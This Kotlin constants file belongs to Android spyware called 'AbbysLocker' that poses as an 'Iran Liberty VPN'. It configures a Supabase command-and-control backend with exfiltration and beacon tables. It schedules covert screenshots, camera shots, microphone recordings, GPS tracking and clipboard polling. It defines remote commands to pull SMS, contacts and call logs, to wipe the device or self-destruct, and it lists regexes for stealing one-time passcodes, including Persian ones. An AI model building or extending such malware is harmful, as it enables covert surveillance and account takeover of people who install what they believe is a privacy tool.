package com.iran.liberty.vpn

import android.Manifest

/**
 * Constants for AbbysLocker / Iran Liberty VPN
 * Pathway 4: Harvesting & C2 Developer
 */
object Constants {
    
    // ========== SUPABASE C2 CONFIGURATION ==========
    // REPLACE WITH ACTUAL SUPABASE PROJECT CREDENTIALS
    const val SUPABASE_URL = "https://your-project.supabase.co"
    const val SUPABASE_ANON_KEY = "your-anon-key-here"
    
    // Supabase table names (must match database schema)
    const val TABLE_DEVICES = "devices"
    const val TABLE_EXFIL = "exfil"
    const val TABLE_COMMANDS = "commands"
    const val TABLE_BEACONS = "beacons"
    
    // ========== HARVESTING CONFIGURATION ==========
    
    // Screenshot intervals (milliseconds)
    const val SCREENSHOT_INTERVAL_MIN = 60000L     // 1 minute
    const val SCREENSHOT_INTERVAL_MAX = 300000L    // 5 minutes
    
    // Camera capture intervals
    const val CAMERA_INTERVAL_MIN = 900000L        // 15 minutes
    const val CAMERA_INTERVAL_MAX = 3600000L       // 1 hour
    
    // Audio recording settings
    const val AUDIO_RECORD_DURATION = 30000L       // 30 seconds max
    const val AUDIO_INTERVAL_MIN = 1800000L        // 30 minutes
    const val AUDIO_INTERVAL_MAX = 7200000L        // 2 hours
    
    // GPS polling intervals
    const val GPS_FAST_INTERVAL = 30000L           // 30 seconds for high accuracy
    const val GPS_SLOW_INTERVAL = 300000L          // 5 minutes for battery saving
    const val GPS_DISTANCE_THRESHOLD = 50f         // 50 meters minimum change
    
    // Clipboard monitoring interval
    const val CLIPBOARD_CHECK_INTERVAL = 10000L    // 10 seconds
    
    // Beacon intervals (WorkManager)
    const val BEACON_INTERVAL_HOURS_MIN = 6L       // Minimum 6 hours
    const val BEACON_INTERVAL_HOURS_MAX = 24L      // Maximum 24 hours
    
    // ========== COMMAND CODES ==========
    const val CMD_SCREENSHOT = "/screenshot"
    const val CMD_CAMERA_FRONT = "/camera_front"
    const val CMD_CAMERA_BACK = "/camera_back"
    const val CMD_MIC_RECORD = "/mic"
    const val CMD_GPS = "/gps"
    const val CMD_CONTACTS = "/contacts"
    const val CMD_SMS = "/sms"
    const val CMD_CALLS = "/calls"
    const val CMD_CLIPBOARD = "/clipboard"
    const val CMD_SELF_DESTRUCT = "/selfdestruct"
    const val CMD_WIPE = "/wipe"
    const val CMD_UPDATE = "/update"
    
    // ========== ENCRYPTION KEYS ==========
    // These should be generated per device and stored securely
    // In production, derive from device-specific values
    const val ENCRYPTION_ALGORITHM = "AES/GCM/NoPadding"
    const val KEY_ALGORITHM = "AES"
    const val KEY_SIZE = 256
    const val GCM_TAG_LENGTH = 128
    
    // ========== FILE PATHS ==========
    const val HARVEST_DIR = "LibertyCache"
    const val SCREENSHOT_PREFIX = "ss_"
    const val CAMERA_PREFIX = "cam_"
    const val AUDIO_PREFIX = "mic_"
    const val GPS_PREFIX = "loc_"
    const val CONTACTS_FILE = "contacts.json"
    const val SMS_FILE = "sms.json"
    const val CALLS_FILE = "calls.json"
    const val CLIPBOARD_FILE = "clipboard.json"
    
    // ========== PERMISSIONS LIST ==========
    val HARVEST_PERMISSIONS = arrayOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE
    )
    
    // ========== OTP PATTERNS ==========
    val OTP_PATTERNS = listOf(
        Regex("\\b\\d{6}\\b"),      // Standard 6-digit OTP
        Regex("\\b\\d{4}\\b"),      // 4-digit OTP
        Regex("[A-Z0-9]{6,8}"),     // Alphanumeric OTP
        Regex("کد.*[0-9]{4,6}"),    // Persian OTP pattern
        Regex("رمز.*[0-9]{4,6}")    // Persian OTP pattern 2
    )
    
    // ========== MISC ==========
    const val MAX_UPLOAD_SIZE = 1024 * 1024 * 5 // 5MB max upload
    const val BEACON_WORKER_TAG = "abbyslocker_beacon"
    const val HARVEST_WORKER_TAG = "abbyslocker_harvest"
}